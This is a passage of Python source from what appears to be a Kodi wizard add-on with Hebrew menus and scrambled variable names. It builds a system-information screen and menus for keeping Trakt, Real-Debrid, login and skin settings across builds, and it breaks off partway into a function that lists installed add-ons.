	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O0O0OOO0O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2724
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O00OO00O0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2725
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2727
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOOO00O00000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2728
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O00O00OO0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2729
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOO0OOOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2730
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2732
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO00O000O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2733
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O00O0O0O0OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2734
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O0O0OOO0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2735
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O0O0OOOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2736
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00OO00O000O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2737
	O00O0OO0O0O0O0OOO =len (O000OO00O00000OOO )+len (OOO0O00000OO000OO )+len (OO0O0OOO0OO0OOO0O )+len (OO0O00OO00OO0O00O )+len (OO0OOOO00OOO0OO00 )+len (O00O00OO00O00O000 )+len (OOOOO0OO0O0O00OO0 )#line:2739
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O00O0OO0O0O0O0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2740
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0OOO0OO0OOO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2741
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O00OO00OO0O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2742
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O00000OO000OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2743
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000OO00O00000OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2744
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOO0OO0O0O00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2745
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O00OO00O00O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2746
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OOOO00OOO0OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2747
def Menu ():#line:2748
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2749
def saveMenu ():#line:2751
	OOOOOO00000O0000O ='[COLOR green]מופעל[/COLOR]';OOO000OOOO0OO000O ='[COLOR red]מבוטל[/COLOR]'#line:2753
	O000OOO00000O0O0O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2754
	O0O000000O0O00OOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:2755
	OOOO0OOO0OO00OO00 ='true'if KEEPINFO =='true'else 'false'#line:2756
	OO00OOOOO0O0O0OOO ='true'if KEEPSOUND =='true'else 'false'#line:2758
	O00O000000O00OOO0 ='true'if KEEPVIEW =='true'else 'false'#line:2759
	OO00000000O00000O ='true'if KEEPSKIN =='true'else 'false'#line:2760
	O0OOOO00OOO00O0OO ='true'if KEEPSKIN2 =='true'else 'false'#line:2761
	OO00OO0O000O0O0OO ='true'if KEEPSKIN3 =='true'else 'false'#line:2762
	O0OOO000OO0O00OOO ='true'if KEEPADDONS =='true'else 'false'#line:2763
	O0OO00O0000O0O00O ='true'if KEEPPVR =='true'else 'false'#line:2764
	OOO0OOOOO0OOOO000 ='true'if KEEPTVLIST =='true'else 'false'#line:2765
	OO0OO00O0OO0OO00O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2766
	OOO00O00OO00O0000 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2767
	O0OO0OOO00OOOO000 ='true'if KEEPHUBTV =='true'else 'false'#line:2768
	OOO0OO0O00O00OOO0 ='true'if KEEPHUBVOD =='true'else 'false'#line:2769
	OOO00O0OO0O000OOO ='true'if KEEPHUBKIDS =='true'else 'false'#line:2770
	OO0O0O0O00OOOO00O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2771
	O00OOO00OO0OOOOO0 ='true'if KEEPHUBMENU =='true'else 'false'#line:2772
	O00O0OOO0O0O0OO0O ='true'if KEEPPLAYLIST =='true'else 'false'#line:2773
	OOOOO0O0OO0O0O00O ='true'if KEEPTRAKT =='true'else 'false'#line:2774
	OOOO000OO00O0000O ='true'if KEEPREAL =='true'else 'false'#line:2775
	OOO0O000000000OO0 ='true'if KEEPRD2 =='true'else 'false'#line:2776
	O00O00OOO00OO00O0 ='true'if KEEPTORNET =='true'else 'true'#line:2777
	OOOOOOO0O00O0O0OO ='true'if KEEPLOGIN =='true'else 'false'#line:2778
	OO0000O0OOOO00O0O ='true'if KEEPSOURCES =='true'else 'false'#line:2779
	O00OOO00000OO0OOO ='true'if KEEPADVANCED =='true'else 'false'#line:2780
	O00000000O00OO00O ='true'if KEEPPROFILES =='true'else 'false'#line:2781
	O0OOOO0OO00O0O0O0 ='true'if KEEPFAVS =='true'else 'false'#line:2782
	OO0O000OO0O00O0O0 ='true'if KEEPREPOS =='true'else 'false'#line:2783
	OO0O0OOOOOOO000OO ='true'if KEEPSUPER =='true'else 'false'#line:2784
	O0O0000O0OO0O0O0O ='true'if KEEPWHITELIST =='true'else 'false'#line:2785
	addFile ('אפשרויות שמירה קודי אנונימוס','',themeit =THEME3 )#line:2789
	if O0O0000O0OO0O0O0O =='true':#line:2790
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2791
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2792
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2793
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2794
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2795
	addFile ('%s התקנת קיר סרטים: '%O000OOO00000O0O0O .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2797
	addFile ('%s שמירת חשבון RD: '%OOOO000OO00O0000O .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2798
	addFile ('%s שמירת חשבון טראקט: '%OOOOO0O0OO0O0O00O .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2799
	addFile ('%s שמירת מועדפים: '%O0OOOO0OO00O0O0O0 .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2802
	addFile ('%s שמירת לקוח טלוויזיה: '%O0OO00O0000O0O00O .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2803
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%OOO0OOOOO0OOOO000 .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2804
	addFile ('%s שמירת אריח סרטים: '%OO0OO00O0OO0OO00O .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2805
	addFile ('%s שמירת אריח סדרות: '%OOO00O00OO00O0000 .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2806
	addFile ('%s שמירת אריח טלויזיה: '%O0OO0OOO00OOOO000 .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2807
	addFile ('%s שמירת אריח תוכן ישראלי: '%OOO0OO0O00O00OOO0 .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2808
	addFile ('%s שמירת אריח ילדים: '%OOO00O0OO0O000OOO .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2809
	addFile ('%s שמירת אריח מוסיקה: '%OO0O0O0O00OOOO00O .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2810
	addFile ('%s שמירת תפריט אריחים ראשי: '%O00OOO00OO0OOOOO0 .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2811
	addFile ('%s שמירת כל האריחים בסקין: '%OO00000000O00000O .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2812
	addFile ('%s שמירת הרחבות שהתקנתי: '%O0OOO000OO0O00OOO .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2819
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%OOOO0OOO0OO00OO00 .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2820
	addFile ('%s שמירת ספריית סרטים וסדרות: '%O0O000000O0O00OOO .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2823
	addFile ('%s שמירת מקורות וידאו: '%OO0000O0OOOO00O0O .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2824
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%OO00OOOOO0O0O0OOO .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2825
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%O00O000000O00OOO0 .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2827
	addFile ('%s שמירת פליליסט לאודר: '%O00O0OOO0O0O0OO0O .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2828
	addFile ('%s שמירת הרחבות ידנית: '%O0O0000O0OO0O0O0O .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2829
	addFile ('%s שמירת הגדרות באפר: '%O00OOO00000OO0OOO .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2833
	addFile ('%s שמירת סופר מועדפים: '%OO0O0OOOOOOO000OO .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2834
	addFile ('%s שמירת רשימות ריפו: '%OO0O000OO0O00O0O0 .replace ('true',OOOOOO00000O0000O ).replace ('false',OOO000OOOO0OO000O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2835
	setView ('files','viewType')#line:2837
def traktMenu ():#line:2839
	O00O00000O00OO0O0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2840
	OO0OOOO000000O00O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2841
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2842
	addFile ('Save Trakt Data: %s'%O00O00000O00OO0O0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2843
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OO0OOOO000000O00O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2844
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2845
	for O00O00000O00OO0O0 in traktit .ORDER :#line:2847
		O00000O0OO0O0000O =TRAKTID [O00O00000O00OO0O0 ]['name']#line:2848
		O0OOO0000O00OOOOO =TRAKTID [O00O00000O00OO0O0 ]['path']#line:2849
		OO00OOOO00OO00O0O =TRAKTID [O00O00000O00OO0O0 ]['saved']#line:2850
		O0O0O000OOO00OOOO =TRAKTID [O00O00000O00OO0O0 ]['file']#line:2851
		O0OO00000O00O0OOO =wiz .getS (OO00OOOO00OO00O0O )#line:2852
		OO000O0000O00O0OO =traktit .traktUser (O00O00000O00OO0O0 )#line:2853
		OO0OOO0OOO0O0OO0O =TRAKTID [O00O00000O00OO0O0 ]['icon']if os .path .exists (O0OOO0000O00OOOOO )else ICONTRAKT #line:2854
		O00OO00OOOOO00O00 =TRAKTID [O00O00000O00OO0O0 ]['fanart']if os .path .exists (O0OOO0000O00OOOOO )else FANART #line:2855
		O00O000OO0OO00O0O =createMenu ('saveaddon','Trakt',O00O00000O00OO0O0 )#line:2856
		O00OOO00O00O000OO =createMenu ('save','Trakt',O00O00000O00OO0O0 )#line:2857
		O00O000OO0OO00O0O .append ((THEME2 %'%s Settings'%O00000O0OO0O0000O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O00O00000O00OO0O0 )))#line:2858
		addFile ('[+]-> %s'%O00000O0OO0O0000O ,'',icon =OO0OOO0OOO0O0OO0O ,fanart =O00OO00OOOOO00O00 ,themeit =THEME3 )#line:2860
		if not os .path .exists (O0OOO0000O00OOOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0OOO0OOO0O0OO0O ,fanart =O00OO00OOOOO00O00 ,menu =O00O000OO0OO00O0O )#line:2861
		elif not OO000O0000O00O0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O00O00000O00OO0O0 ,icon =OO0OOO0OOO0O0OO0O ,fanart =O00OO00OOOOO00O00 ,menu =O00O000OO0OO00O0O )#line:2862
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO000O0000O00O0OO ,'authtrakt',O00O00000O00OO0O0 ,icon =OO0OOO0OOO0O0OO0O ,fanart =O00OO00OOOOO00O00 ,menu =O00O000OO0OO00O0O )#line:2863
		if O0OO00000O00O0OOO =="":#line:2864
			if os .path .exists (O0O0O000OOO00OOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O00O00000O00OO0O0 ,icon =OO0OOO0OOO0O0OO0O ,fanart =O00OO00OOOOO00O00 ,menu =O00OOO00O00O000OO )#line:2865
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O00O00000O00OO0O0 ,icon =OO0OOO0OOO0O0OO0O ,fanart =O00OO00OOOOO00O00 ,menu =O00OOO00O00O000OO )#line:2866
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OO00000O00O0OOO ,'',icon =OO0OOO0OOO0O0OO0O ,fanart =O00OO00OOOOO00O00 ,menu =O00OOO00O00O000OO )#line:2867
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2869
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2870
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2871
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2872
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2873
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2874
	setView ('files','viewType')#line:2875
def realMenu ():#line:2877
	O0O0O000O0O0000O0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2878
	OO0OO0OO0OO000OOO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2879
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2880
	addFile ('Save Real Debrid Data: %s'%O0O0O000O0O0000O0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2881
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO0OO0OO0OO000OOO ),'',icon =ICONREAL ,themeit =THEME3 )#line:2882
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2883
	for O0OO0O0OO000OOOO0 in debridit .ORDER :#line:2885
		O0OOO0OO0O0O0O00O =DEBRIDID [O0OO0O0OO000OOOO0 ]['name']#line:2886
		O00O00000000OOO00 =DEBRIDID [O0OO0O0OO000OOOO0 ]['path']#line:2887
		O00OOOOO00O0OOOO0 =DEBRIDID [O0OO0O0OO000OOOO0 ]['saved']#line:2888
		OOO0O0O0O000O0O0O =DEBRIDID [O0OO0O0OO000OOOO0 ]['file']#line:2889
		OO00OO000O0O00000 =wiz .getS (O00OOOOO00O0OOOO0 )#line:2890
		O0O0OOO000OO0OOO0 =debridit .debridUser (O0OO0O0OO000OOOO0 )#line:2891
		O0O0O00000O0OO000 =DEBRIDID [O0OO0O0OO000OOOO0 ]['icon']if os .path .exists (O00O00000000OOO00 )else ICONREAL #line:2892
		OO00000OOOOOO0OOO =DEBRIDID [O0OO0O0OO000OOOO0 ]['fanart']if os .path .exists (O00O00000000OOO00 )else FANART #line:2893
		O0OOOO000O00OOOO0 =createMenu ('saveaddon','Debrid',O0OO0O0OO000OOOO0 )#line:2894
		O000O0O0O0O00OO0O =createMenu ('save','Debrid',O0OO0O0OO000OOOO0 )#line:2895
		O0OOOO000O00OOOO0 .append ((THEME2 %'%s Settings'%O0OOO0OO0O0O0O00O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0OO0O0OO000OOOO0 )))#line:2896
		addFile ('[+]-> %s'%O0OOO0OO0O0O0O00O ,'',icon =O0O0O00000O0OO000 ,fanart =OO00000OOOOOO0OOO ,themeit =THEME3 )#line:2898
		if not os .path .exists (O00O00000000OOO00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O0O00000O0OO000 ,fanart =OO00000OOOOOO0OOO ,menu =O0OOOO000O00OOOO0 )#line:2899
		elif not O0O0OOO000OO0OOO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0OO0O0OO000OOOO0 ,icon =O0O0O00000O0OO000 ,fanart =OO00000OOOOOO0OOO ,menu =O0OOOO000O00OOOO0 )#line:2900
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O0OOO000OO0OOO0 ,'authdebrid',O0OO0O0OO000OOOO0 ,icon =O0O0O00000O0OO000 ,fanart =OO00000OOOOOO0OOO ,menu =O0OOOO000O00OOOO0 )#line:2901
		if OO00OO000O0O00000 =="":#line:2902
			if os .path .exists (OOO0O0O0O000O0O0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0OO0O0OO000OOOO0 ,icon =O0O0O00000O0OO000 ,fanart =OO00000OOOOOO0OOO ,menu =O000O0O0O0O00OO0O )#line:2903
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0OO0O0OO000OOOO0 ,icon =O0O0O00000O0OO000 ,fanart =OO00000OOOOOO0OOO ,menu =O000O0O0O0O00OO0O )#line:2904
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO00OO000O0O00000 ,'',icon =O0O0O00000O0OO000 ,fanart =OO00000OOOOOO0OOO ,menu =O000O0O0O0O00OO0O )#line:2905
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2907
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2908
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2909
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2910
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2911
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2912
	setView ('files','viewType')#line:2913
def loginMenu ():#line:2915
	O0O0OO00000OO0O0O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:2916
	O00OOOOOOO00O0OOO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:2917
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:2918
	addFile ('Save Login Data: %s'%O0O0OO00000OO0O0O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:2919
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O00OOOOOOO00O0OOO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2920
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2921
	for O0O0OO00000OO0O0O in loginit .ORDER :#line:2923
		O00000OOOOO0OO0OO =LOGINID [O0O0OO00000OO0O0O ]['name']#line:2924
		O0O000OO0OO000000 =LOGINID [O0O0OO00000OO0O0O ]['path']#line:2925
		O0OO000OOOO0OO0OO =LOGINID [O0O0OO00000OO0O0O ]['saved']#line:2926
		O0OO0O00O0O0000OO =LOGINID [O0O0OO00000OO0O0O ]['file']#line:2927
		OO0O00OO00000O0OO =wiz .getS (O0OO000OOOO0OO0OO )#line:2928
		O0OOOOOO000OO00OO =loginit .loginUser (O0O0OO00000OO0O0O )#line:2929
		O000O00000OO00O00 =LOGINID [O0O0OO00000OO0O0O ]['icon']if os .path .exists (O0O000OO0OO000000 )else ICONLOGIN #line:2930
		O0OOOOOO0O0O0OO0O =LOGINID [O0O0OO00000OO0O0O ]['fanart']if os .path .exists (O0O000OO0OO000000 )else FANART #line:2931
		OO0OOOOOO0O0O0OO0 =createMenu ('saveaddon','Login',O0O0OO00000OO0O0O )#line:2932
		O00O0O00OO0OO0OO0 =createMenu ('save','Login',O0O0OO00000OO0O0O )#line:2933
		OO0OOOOOO0O0O0OO0 .append ((THEME2 %'%s Settings'%O00000OOOOO0OO0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0O0OO00000OO0O0O )))#line:2934
		addFile ('[+]-> %s'%O00000OOOOO0OO0OO ,'',icon =O000O00000OO00O00 ,fanart =O0OOOOOO0O0O0OO0O ,themeit =THEME3 )#line:2936
		if not os .path .exists (O0O000OO0OO000000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000O00000OO00O00 ,fanart =O0OOOOOO0O0O0OO0O ,menu =OO0OOOOOO0O0O0OO0 )#line:2937
		elif not O0OOOOOO000OO00OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0O0OO00000OO0O0O ,icon =O000O00000OO00O00 ,fanart =O0OOOOOO0O0O0OO0O ,menu =OO0OOOOOO0O0O0OO0 )#line:2938
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OOOOOO000OO00OO ,'authlogin',O0O0OO00000OO0O0O ,icon =O000O00000OO00O00 ,fanart =O0OOOOOO0O0O0OO0O ,menu =OO0OOOOOO0O0O0OO0 )#line:2939
		if OO0O00OO00000O0OO =="":#line:2940
			if os .path .exists (O0OO0O00O0O0000OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0O0OO00000OO0O0O ,icon =O000O00000OO00O00 ,fanart =O0OOOOOO0O0O0OO0O ,menu =O00O0O00OO0OO0OO0 )#line:2941
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0O0OO00000OO0O0O ,icon =O000O00000OO00O00 ,fanart =O0OOOOOO0O0O0OO0O ,menu =O00O0O00OO0OO0OO0 )#line:2942
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0O00OO00000O0OO ,'',icon =O000O00000OO00O00 ,fanart =O0OOOOOO0O0O0OO0O ,menu =O00O0O00OO0OO0OO0 )#line:2943
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2945
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2946
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2947
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2948
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2949
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2950
	setView ('files','viewType')#line:2951
def fixUpdate ():#line:2953
	if KODIV <17 :#line:2954
		O0OOOO0OOO0OOOOOO =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:2955
		try :#line:2956
			os .remove (O0OOOO0OOO0OOOOOO )#line:2957
		except Exception as O0OO0OO0OO0O0OO00 :#line:2958
			wiz .log ("Unable to remove %s, Purging DB"%O0OOOO0OOO0OOOOOO )#line:2959
			wiz .purgeDb (O0OOOO0OOO0OOOOOO )#line:2960
	else :#line:2961
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:2962
def removeAddonMenu ():#line:2964
	OOOOOO00O0O00O0OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2965
	OO0O00000OO0OO00O =[];OOOO00OO0OO0OOOO0 =[]#line:2966
	for O00O0O00O0O0O00OO in sorted (OOOOOO00O0O00O0OO ,key =lambda O0O0000000O0O00O0 :O0O0000000O0O00O0 ):#line:2967
		O0O00000O000OO0OO =os .path .split (O00O0O00O0O0O00OO [:-1 ])[1 ]#line:2968
		if O0O00000O000OO0OO in EXCLUDES :continue #line:2969
		elif O0O00000O000OO0OO in DEFAULTPLUGINS :continue #line:2970
		elif O0O00000O000OO0OO =='packages':continue #line:2971
		O0O0OO000OO0OO0OO =os .path .join (O00O0O00O0O0O00OO ,'addon.xml')#line:2972
		if os .path .exists (O0O0OO000OO0OO0OO ):#line:2973
			OOO0OOO0O0O0000O0 =open (O0O0OO000OO0OO0OO )#line:2974
